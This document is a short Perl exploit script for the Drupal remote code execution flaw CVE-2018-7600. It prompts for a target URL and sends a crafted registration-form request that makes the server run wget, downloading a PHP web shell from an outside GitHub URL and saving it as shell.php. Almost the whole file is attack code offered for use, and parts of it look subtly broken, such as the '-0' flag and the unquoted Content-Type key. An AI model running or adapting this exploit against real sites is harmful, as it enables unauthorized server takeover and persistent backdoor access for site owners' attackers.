#!/usr/bin/perl

# Title : Drupal 0day Remote PHP Code Execution (Perl)
# Author = GIST
# date : 14 April 2018
# CVE : CVE-2018-7600
# Vendor : https://www.drupal.org/
# Tested on : Ubuntu


use LWP::Simple;
use LWP::UserAgent;

my $ua = LWP::UserAgent->new;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print <<logo;
                                                              
 ____                  _    _____         _     _ _           
|    \  ___ _ _ ___ ___| |  |   __|_ _ ___| |___|_| |_ ___ ___ 
|  |  |  _| | | . | .'| |  |   __|_'_| . | | . | |  _| -_|  _|
|____/|_| |___|  _|__,|_|  |_____|_,_|  _|_|___|_|_| |___|_|  
              |_|                    |_|                      
logo

print "\nEnter Your Target URL > ";
$url=<>;
chomp($url);

$exploit = "$url/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";

$ajax = "_drupa_ajax";
$mail = "mail[#post_render][]";
$maill= "mail[#type]";
$mailll = "mail[#markup]";
$wget = "wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php -0 shell.php";
$response = $ua->post($exploit, Content-Type => 'multipart/form-data', Content => [form_id => 'user_register_form', $ajax => '1', $mail => 'exec', $maill => 'markup', $mailll => $wget]);

if ($response =~ /200/)
{
print "\nPayload Uploaded successfully $url/shell.php\n";
}
else{
print "\nTarget Is Not Vulnerable\n";    
}
